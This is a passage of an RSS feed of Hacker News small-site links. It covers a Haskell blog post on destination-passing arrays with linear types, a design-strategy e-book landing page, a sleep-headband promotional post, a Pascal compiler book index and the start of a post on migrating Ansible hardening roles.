<div data-language="haskell"><pre><code><span>splitArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span></code></pre></div>
<p>Now consider the following (admittedly not especially useful)
function:</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray2</span> <span>a</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>&lt;&gt;</span> <span>copyArray</span> <span>ar</span></code></pre></div>
<p>When the question doesn’t exist, each call to <code>copyArray</code> has, no matter what,
to allocate an array, which is then copied into a new array. It means
that we are making a superfluous copy of our original array,
only to discard it immediately. This is quite wasteful.</p>
<h2>Won’t fusion take care of that, though?</h2>
<p>Often, you can, indeed, rely on array fusion to avoid too egregious a
behaviour. Array fusion, such as implemented in the excellent <a href="https://hackage.haskell.org/package/vector">vector</a>
library will eliminate a ton of intermediate allocations.</p>
<p>However, fusion is unreliable. Sometimes, a simple refactoring will
push a function’s size beyond what GHC is willing to inline, and it
will break an entire fusion pipeline. Most of the time, this is fine,
but not when you are dependent on fusion happening. And if you need
GHC to produce code without allocations, why not write your program directly as you want
it, rather than try and coax the compiler into hopefully eliminating
the allocations for you.</p>
<p>This has been a guiding principle in the development of the linear
types project: <strong>compiler optimisations are great, as you don’t need
to think about a lot of things; until you do, and you find yourself
second-guessing the optimiser</strong>. When that happens, we want linear
types to empower you to write the code that you mean, without
sacrificing Haskell’s type safety.</p>
<p>Besides, in the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">article about F̃</a>, a restricted array-based
functional language which compiles to very efficient code, the authors
find significant performance gains for using destination-passing on
top of an array fusion optimisation. They only use destination-passing
in the optimiser, though, not as a language feature.</p>
<p>Finally, fusion doesn’t always work. Suppose I rewrite my <code>copyArray2</code>
function to use threads to better utilise my multicore architecture</p>
<div data-language="haskell"><pre><code><span>copyArray3</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>IO</span> <span>(</span><span>Array</span> <span>a</span><span>)</span>
<span>copyArray3</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>do</span>
    <span>(</span><span>bl</span><span>,</span> <span>br</span><span>)</span> <span>&lt;-</span> <span>concurrently</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>al</span><span>)</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>ar</span><span>)</span>
    <span>return</span> <span>$</span> <span>bl</span> <span>&lt;&gt;</span> <span>br</span></code></pre></div>
<p>This is beyond a fusion framework ability to optimise. Or maybe I want
to copy my array into a memory mapped buffer. The point is: fusion
will do a lot for you, just not everything.</p>
<h2>Ok, but does that mean I have to use ST everywhere?</h2>
<p>The obvious way to encode destination-passing style, in Haskell, is to
move all our computation to <code>ST</code>, so that <code>copyArray</code> would be</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>ST</span> <span>(</span><span>)</span></code></pre></div>
<p>But it’s not very congruent with how functional programmers write
their programs. It does lift all of the above limitations, at the
price of adding state everywhere, which is an entire error-inducing
surface that functional programming usually avoids.</p>
<p>It’s a huge price to pay, and that’s why the <a href="https://hackage.haskell.org/package/vector">vector</a> library is not
structured like this. It does feature mutable arrays, but immutable
arrays are very much encouraged.</p>
<p>This is where <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> help. Indeed, let’s take a
step back and ask: what makes a destination impure to begin with?</p>
<ul>
<li>If I read out a cell, then write to it, then read it again: I’ll see a
different result the second time.</li>
<li>If I write to the same cell twice, the writes need to be ordered,
otherwise the result would be non-deterministic.</li>
<li>Reading a cell which has not been initialised is non-deterministic
(though in most case, we can salvage this by initialising every cell
with <code>undefined</code>)</li>
</ul>
<p>All of these behaviours are prohibited in pure code. But we could
avoid all the prohibited behaviours if we could make sure that each
cell is written to exactly once before being read. Aha! Exactly once,
this is the sort of thing that linear types are good at! Ok, so let’s
try again:</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span></code></pre></div>
<p>This means that <code>copyArray</code> is a <em>pure</em> function which uses its destination
(in its entirety) exactly once. We only need to make sure that there
is only ever a unique pointer to a destination array, which we do with
the <code>alloc</code> function:</p>
<div data-language="haskell"><pre><code><span>alloc</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>(</span><span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span><span>)</span> ⊸ <span>Array</span> <span>a</span></code></pre></div>
<p>A destination is allocated for the scope of the linear function. At
the end of the function, we know that the destination has been fully
filled, and so we get an array out. From this destination-passing
version of <code>copyArray</code>, by the way, it is easy to retrieve the
direct style variant:</p>
<div data-language="haskell"><pre><code><span>copyArray</span>' <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray</span>' <span>a</span> <span>=</span> <span>alloc</span> <span>(</span><span>length</span> <span>a</span><span>)</span> <span>(</span><span>\</span><span>d</span> <span>-&gt;</span> <span>copyArray</span> <span>a</span> <span>d</span><span>)</span></code></pre></div>
<p>The reverse, as I’ve been arguing throughout this post, is very much
not true. So the destination-passing function is the more fundamental
one.</p>
<p>Now, to be able to implement <code>copyArray2</code>, we need a function which
splits destinations</p>
<div data-language="haskell"><pre><code><span>splitDArray</span> <span>::</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>Then, it is just a matter of following the types (the curious-looking <code>&amp; \case</code> construction is due to a limitation of the current
implementation of linear types in GHC, see <a href="https://github.com/tweag/linear-base/blob/8642e4209ffd663e1f1f35ddd977da0d073fa1af/docs/USER_GUIDE.md#case-statements-are-not-linear">here</a>)</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span>
<span>copyArray2</span> <span>a</span> <span>d</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>splitDArray</span> <span>d</span> <span>&amp;</span> <span>\</span><span>case</span>
    <span>(</span><span>dl</span><span>,</span> <span>dr</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>dl</span> <span>`lseq`</span> <span>copyArray</span> <span>ar</span> <span>dr</span></code></pre></div>
<p>Voilà! No superfluous allocation. Not because of the optimiser, but
because of the semantics of my program: it doesn’t allocate an array
anywhere.</p>
<p>You’ll find a more complete destination array interface in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Destination.hs">the
<code>Data.Array.Destination</code> module of linear-base</a>.</p>
<h2>Closing thoughts</h2>
<p>One of the features of linear types, is that they often allow to
expose as pure interfaces objects which appear to be intrinsically
impure. But I want to argue that, in the case of destinations, we’ve
actually done more than this: we’ve made the interface <em>better</em> than
the impure interface. Not because pure interfaces are better than
impure interfaces (though it’s a defensible position), but because the
linear destination interface is a more faithful representation of what
destinations mean.</p>
<p>There is no longer confusion about what is an input and what is an
output: inputs are <code>Array</code>, and outputs are <code>DArray</code>. Destinations are
there solely for output, they can’t be used as a temporary store of
data. And the types ensure that they are fully filled, and that we
don’t accidentally overwrite an output, by the time the destination is
read back as an array.</p>
<p>And this is pretty neat.</p>
<p>If you want to go a bit deeper into this particular brand of weed, let
me leave you with a handful of comments which you can take either as
closing this blog post, or opening new avenues.</p>
<ul>
<li>The <code>alloc</code> function takes a destination-consuming function as an
argument, instead of returning a destination directly. This style is
common in Linear Haskell, as a means to enforce uniqueness. It is
sometimes seen as a limitation of Linear Haskell’s design. However
in this particular case, the function is necessary to <em>delimit the
scope</em> of the destination. In fact, the <code>alloc</code> function is
virtually identical to that of the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">F̃ article</a>, where there
is no linear typing whatsoever.</li>
<li>Affine types (affine arguments are consumed <em>at most</em> once,
rather than <em>exactly</em> once for linear arguments) are sometimes
preferable to linear types. For instance affine types appear to
<a href="https://www.tweag.io/blog/2018-06-21-linear-streams/">represent streaming
computations better</a>. But
in the case of destinations we really do want linear types: it
wouldn’t make as much sense to return from <code>alloc</code> with a
partially-filled destination.</li>
<li>When using linear types to make a pure interface to array functions
which, in fact, mutate an array for efficiency (like in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Mutable/Linear.hs">this module
of linear
base</a>),
we lose the ability to alias the mutable array in exchange for
purity. Sometimes it’s a perfectly acceptable trade-off, but some
algorithms depend on sharing mutation for efficiency, these are not
available with linear pure mutable arrays. We are not making such a
trade-off for destinations: linear destinations, being pure output,
are, arguably, a more faithful interface for destination-passing
style than mutable array.</li>
<li>
<p>Have you noticed how in the destination-passing <code>copyArray2</code>, the
call to array concatenation from the direct-style implementation has
been replaced by a call to <code>splitDArray</code>? And, if you have, have you
also noticed the symmetry between these two functions?</p>
<div data-language="haskell"><pre><code><span>uncurry</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>::</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>splitDArray</span> <span>::</span> <span>Darray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>This is not a coincidence. There is a sort of duality between
destinations and constructors. This …</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tweag.io/blog/2020-11-11-linear-dps/">https://www.tweag.io/blog/2020-11-11-linear-dps/</a></em></p>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-11-11-linear-dps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068394</guid>
            <pubDate>Thu, 12 Nov 2020 10:22:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Laptop Reviews]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068348">thread link</a>) | @manuanuragck
<br/>
November 12, 2020 | https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267 | <a href="https://web.archive.org/web/*/https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068348</guid>
            <pubDate>Thu, 12 Nov 2020 10:15:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Essential Guide to Design Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068234">thread link</a>) | @mmanja
<br/>
November 12, 2020 | https://designstrategy.guide/the-ultimate-design-strategy-e-book/ | <a href="https://web.archive.org/web/*/https://designstrategy.guide/the-ultimate-design-strategy-e-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

	
	

	
	<main id="main">
<div id="content" role="main">
	<div>
		<div>
			<div>
				
				
														
							<section id="section_1428578920">
		

		<div>
			
<div>
<p><img src="https://designstrategy.guide/wp-content/uploads/2020/03/white-layer.png"><br>
<img src="https://designstrategy.guide/wp-content/uploads/2020/10/bg-blurb.png"></p>
<div id="row-1816171951">

	

	

	<div id="col-1180326236">
		<div>
			
			
<h3>The Ultimate Design Strategy e-book</h3>
<p>Learn how to leverage design strategy to increase ROI, enhance your design’s value and much more.</p>
<p><a rel="noopener noreferrer" href="https://designstrategy.mykajabi.com/pl/237579" target="_blank">
    <span>CLAIM YOUR FREE COPY</span>
  </a>

		</p></div>
			</div>

	

	

	


</div>
		</div>

		

	</div></section>
	
	<section id="section_1001994106">
		

		<div>
			
	<div>

		<div>
						<p><img width="1200" height="890" src="https://designstrategy.guide/wp-content/uploads/2020/11/Ipad-with-hand-small.gif" alt="DesignStrategyEbook" loading="lazy">											</p>
					</div>

		
	</div>
	
<div id="row-234811436">

	<div id="col-917772116">
		<div>
			
			
	<div id="image_29609973">
								<p><img width="1020" height="427" src="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-300x126.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-768x322.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-600x251.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white.png 1181w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1046563610">

	<div id="col-4795011">
		<div>
			
			
<h2>Why am I giving<br>you this eBook for free?</h2>
<p>Plenty of designers and product managers feel lost and frustrated while trying to prove their product design’s value and making a tangible impact. I will show you how to leverage design strategy to raise your profit.</p>
<p>I BELIEVE THAT THERE ARE 4 THINGS TO FOCUS ON:</p>
		</div>
			</div>

	
</div>

<div id="row-1302578912">

	

	

	<div id="col-1832425323">
		<div>
			
			
<p>Embrace your<br>metrics and KPIs</p>

		</div>
			</div>

	


</div>
<div id="row-875900862">

	<div id="col-154138184">
		<div>
			
			
	<div id="image_1474820842">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1177567540">

	<div id="col-86145315">
		<div>
			
			
<h3><img loading="lazy" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png" alt="The Design Strategy E-book" width="325" height="462" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png 500w, https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL-211x300.png 211w" sizes="(max-width: 325px) 100vw, 325px"></h3>
<h3><span>Why and how? </span></h3>
<p><span>That’s what I unpack in the ebook.</span></p>
<p>It’s a bull***-free guide that’ll help you to create your design strategy, raise your conversion rates and implement better processes.</p>
		</div>
			</div>

	
</div>
<div id="row-223983644">

	<div id="col-1806766300">
		<div>
			
			
	<div id="image_47441743">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-328273916">

	<div id="col-2036686287">
		<p>
			
			
<h2>Goodies that come with this book</h2>
		</p>
			</div>

	
</div>
<div id="row-724314231">

	

	

	<div id="col-1981625223">
		<p>Research diagrams and insights</p>
		

	</div>

	
</div>
<div id="row-169523215">

	

	

	<div id="col-224825811">
		<p>Links that’ll expand your knowledge</p>
		

	</div>

	
</div>

<div id="row-2046131456">

	<div id="col-1262136374">
		<div>
			
			
	<div id="image_39755799">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_286609937">
		

		<div>
			

<div id="row-1168382232">

	<div id="col-483240161">
		<div>
			
			
<p><span>It is an eye-opener for every designer.<br>
</span></p>
<p><span>Claudia, UX designer</span></p>
		</div>
			</div>

	

	

	

	<div id="col-965870416">
		<div>
			
			
<p><span>Too many startups fail because they don’t know which part they need to focus on (UX, dev, design). This e-book showed me new methods that I need to try out. </span></p>
<p><span>Jessica, Project Manager</span></p>
		</div>
			</div>

	
</div>
	
	
<div id="row-559272427">

	<div id="col-180102412">
		<div>
			
			
<p><span>This book challenged my knowledge and showed me how and where to level up my design knowledge. Romina, thanks for choosing me to be part of your UX testing group. Plus, the design is just wow.<br></span></p>
<p><span>Monika, CMO</span></p>
		</div>
			</div>

	

	

	

	<div id="col-792348285">
		<div>
			
			
<p><span>Now I know how to choose Design metrics. 🙂</span></p>
<p><span>Sara, Front-End Developer</span></p>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_483034149">
		

		<div>
			
<div id="row-81372461">

	<div id="col-1634066966">
		<div>
			
			
	<div id="image_1039366691">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1188405459">

	<div id="col-1328963836">
		<div>
			
			
<h3><span>Meet the author</span></h3>
	
	
<div id="row-541683573">

	<div id="col-1601101095">
		<div>
			
			
	<div id="image_1751412458">
								<p><img width="682" height="1024" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg" alt="Romina Kavcic Websi 2020" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg 682w, https://designstrategy.guide/wp-content/uploads/2020/11/03-200x300.jpg 200w, https://designstrategy.guide/wp-content/uploads/2020/11/03-768x1152.jpg 768w, https://designstrategy.guide/wp-content/uploads/2020/11/03-1024x1536.jpg 1024w, https://designstrategy.guide/wp-content/uploads/2020/11/03-600x900.jpg 600w, https://designstrategy.guide/wp-content/uploads/2020/11/03.jpg 1141w" sizes="(max-width: 682px) 100vw, 682px">						
					</p>
								

	</div>
	
		</div>
			</div>

	

	

	

	<div id="col-693364460">
		<p><span>Romina is an award-winning Design Strategist who holds a Master of Business Administration. She has 15+ years of career experience in design work and consulting across both tech startups and several marquee tech unicorns such as Stellar.org, Outfit7, Databox, Xamarin, Chipolo, Singularity.NET, etc. She is currently advising, coaching and consulting with companies on design strategy &amp; management, visual design and user experience. Her work has been published on Forbes, Hackernews, Blockgeeks, Newsbtc, Bizjournals, and featured on Apple Store.</span></p>
			</div>

	
</div>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	

						
												</div>
		</div>
	</div>
</div>


</main><!-- #main -->

<!-- .footer-wrapper -->

</div></div>]]>
            </description>
            <link>https://designstrategy.guide/the-ultimate-design-strategy-e-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068234</guid>
            <pubDate>Thu, 12 Nov 2020 09:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neurohacking the World Sleep Championships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068156">thread link</a>) | @pedalpete
<br/>
November 12, 2020 | https://soundmind.co/blog/neurohacking-the-world-sleep-championships | <a href="https://web.archive.org/web/*/https://soundmind.co/blog/neurohacking-the-world-sleep-championships">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e2b9e06d42ac6600e580"><div><p>I’m the last person you’d expect to compete in the <a href="https://www.worldsleepchampionships.com/">World Sleep Championships</a>. A life-long insomniac with Central Sleep Apnea, I’ve spent the last 10 months diving into the latest in neuroscience research with the goal of not only helping insomnia sufferers, but improving Sleep Performance for the greater population.&nbsp;</p><p>The competition used the data from Oura rings which classifies sleep as REM, light or deep, and factors in the number of hours you slept, how quickly you fell asleep, and how much time you spent in each sleep state.&nbsp;</p><h3>More people have died in their sleep than during any other activity, making this the most dangerous and extreme competition that has ever taken place! </h3><p>The organizers of the World Sleep Championships decided on a tournament type structure for the competition. We started with the seeding process to get our baseline sleep data, and build the competition tree. Seeding was followed by 5 alternating nights of head-to-head competition where the highest score for each pair of competitors made it through to the next round .</p><p>The only rule was that we couldn’t take sleeping pills, everything else was fair game. Rumour had it that sleep deprivation on non-competition nights was the strategy of choice for many competitors.</p><h3>I didn’t stoop to such tactics, instead relying on the SoundMind prototype to guide me through the competition.</h3><p>It started off very well, when I averaged the 2nd highest scores through seeding, and managed the 2nd highest score of 92 points on the first night of competition<br></p><p>I believed Oura was removing points for a low amount REM sleep as a percentage of my overall sleep, so I made an adjustment to the sounds played by SoundMind to promote more REM sleep. I had a hint that this would work, but, it was a bit like running a marathon in a new pair of sneakers. A wrong move and my competition would be over.</p><p>My competitor that night put in a very solid score of 93, and apparently began his celebrations early, before seeing the 96 points I achieved with the updated version of SoundMind. This turned out to be the highest score of the entire tournament.</p><p>This was followed-up by a score of 95 the next night of competition. Far above my pre-SoundMind average in the low 70s.</p><p>Going into the semi-finals, a win looked unlikely. At 2am, somebody rang the buzzer at my apartment, it was a food delivery guy who had the wrong address. When the buzzer rang a 2nd time at 2:30am, I was wondering if this was a new tactic my opponent had discovered as the only way to destroy my sleep and chances at winning the night. Waking up, I felt pretty good, but didn’t know if I’d have the high score to win with only 89 points. However, potentially my opponent's guilt over interfering in my sleep, if she actually had done this, kept her awake fretting, and I had a few points lead over her, which led me into the finals.</p><p>I felt confident going into the finals. Not only because of the high scores I had been seeing, but due to the consistency. Anybody can have one or two nights of great sleep, but to consistently be able to sleep great every night, that’s the real challenge, and also why the competition rewards the person who can get the high score night after night.</p><div><p>Potentially with a bit of nerves coming into play, I only managed to eke out a 93 on the final night, and I wasn’t sure if that would be enough to take the win from a man with a history of scoring in the low 90s. To add to the suspense, the competition takes place around the world, and living in Australia, we’re the 2nd country to be awake, so I had to wait a day to get the final results!</p><p>It was a close final, but I managed to win out by a mere 2 points! Though I don’t feel a strong need to give an acceptance speech or thank my sponsors, I do want to thank Damian and Todd for organizing the event, and to all my fellow competitors. </p><p>The most important result here for me is that we had a fun way to test out the SoundMind tech, and see it in action as more than just another score or another great night sleep. As I’ve been using SoundMind it’s been interesting to see how quickly I’ve adapted to just accepting that a good night sleep is what happens. I almost forget what it was like being awake all night, and the agony which comes with that.&nbsp;</p></div><p>We’ll have more updates, and be sharing more data as we progress, and sign-up to the wait list to reserve your spot and get one of the first headbands so you can have amazing sleep too!</p><p>Soon we’ll all be sleeping well with SoundMind.</p></div></div></div>]]>
            </description>
            <link>https://soundmind.co/blog/neurohacking-the-world-sleep-championships</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068156</guid>
            <pubDate>Thu, 12 Nov 2020 09:40:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pascal Implementation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067899">thread link</a>) | @z3phyr
<br/>
November 12, 2020 | https://homepages.cwi.nl/~steven/pascal/book/pascalimplementation.html | <a href="https://web.archive.org/web/*/https://homepages.cwi.nl/~steven/pascal/book/pascalimplementation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<h2>The P4 Compiler and Interpreter</h2>
<p><em>by <a href="http://www.cwi.nl/~steven/">Steven Pemberton</a>, 
<a href="http://www.cwi.nl/~steven/amsterdam.html">Amsterdam</a>, 
and <a href="http://www.it.bton.ac.uk/staff/mcd/">Martin Daniels</a></em>
</p>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/0intro.html">Chapter 0: Preface and Introduction</a></p>
<h2>Part 1: The Compiler</h2>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/1lexical.html">Chapter 1: Input and Lexical Analysis</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/2syntax.html">Chapter 2: Syntax Analysis</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/3semantic.html">Chapter 3: Semantic Analysis</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/4codegen.html">Chapter 4: Code Generation</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/5expressions.html">Chapter 5: Compiling Expressions</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/6procfunc.html">Chapter 6: Compiling Procedures and Functions</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/7statements.html">Chapter 7: Compiling Statements</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/8declarations.html">Chapter 8: Compiling Declarations</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/9program.html">Chapter 9: Compiling the Program</a>
</p>
<h2>Part 2: The Interpreter</h2>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/10pcode.html">Chapter 10: The P-code Machine</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/11assembler.html">Chapter 11: The Assembler</a><br>
<a href="https://homepages.cwi.nl/~steven/pascal/book/12interpreter.html">Chapter 12: The Interpreter</a>
</p>
<h2>Appendices</h2>
<p>
<a href="https://homepages.cwi.nl/~steven/pascal/book/13appendices.html">Chapter 13: Appendices</a>
</p>
<p>Copyright © 1982, 2002 Steven Pemberton and Martin Daniels, all rights reserved.</p>
<!--
<pre>
ok	recreate diags
ok	em F
ok	em equationvariables
ok	div
ok	p class=body
	` to '
	heading types
	pre for programs (done for 6)
li for numbered lists
	li for notes
dl's for class="Line" (to do for 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)
var
kw
&lt;code&gt;
line nos: make them links to the code

deal with single note ols
fix part 2 notes
italicise comments in program fragments
move labels diagrams to semantics
redate preface
add navigation to all chapters
</pre>
-->




</div>]]>
            </description>
            <link>https://homepages.cwi.nl/~steven/pascal/book/pascalimplementation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067899</guid>
            <pubDate>Thu, 12 Nov 2020 09:03:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating our dev-sec Ansible roles to a collection]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067897">thread link</a>) | @zufallsheld
<br/>
November 12, 2020 | https://dev-sec.io/blog/2020-10-11-ansible-collection/ | <a href="https://web.archive.org/web/*/https://dev-sec.io/blog/2020-10-11-ansible-collection/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
    <article>
      
      

<p>In July 2020 we decided to move our existing Ansible roles for Linux, ssh, nginx and MySQL into an Ansible collection (<a href="https://docs.ansible.com/ansible/latest/user_guide/collections_using.html">what is a collection?</a>).</p>



<p>Having only one repository for all roles means we don’t have to duplicate code. We have one common test-suite for all roles that works the same for every role.
Also Collections are the future, as there is possibly no support for roles in the next version of Ansible Galaxy (see <a href="https://github.com/ansible/galaxy_ng/issues/58">ansible/galaxy_ng#58</a>).</p>



<p>Collections are only supported from Ansible 2.9 and onwards. However Ansible 2.8 is still supported (<a href="https://docs.ansible.com/ansible/latest/reference_appendices/release_and_maintenance.html#release-status">https://docs.ansible.com/ansible/latest/reference_appendices/release_and_maintenance.html#release-status</a>). This means we need to support the separate roles until 2.9 is the oldest maintained release.</p>



<p>We decided to use the ansible-os-hardening git repository for our new collection because it has the most stars. We didn’t want to lose our precious internet points!
We created a separate branch and worked on this one until the migration to the main branch was ready.
All the roles that lived in separate repositories should move to the <code>roles</code>-directory. It was important for us to keep the history of all roles. Fortunately we weren’t the first ones who wanted to migrate one repository with its history to another. So with the help of StackOverflow, migrating them wasn’t too hard.</p>

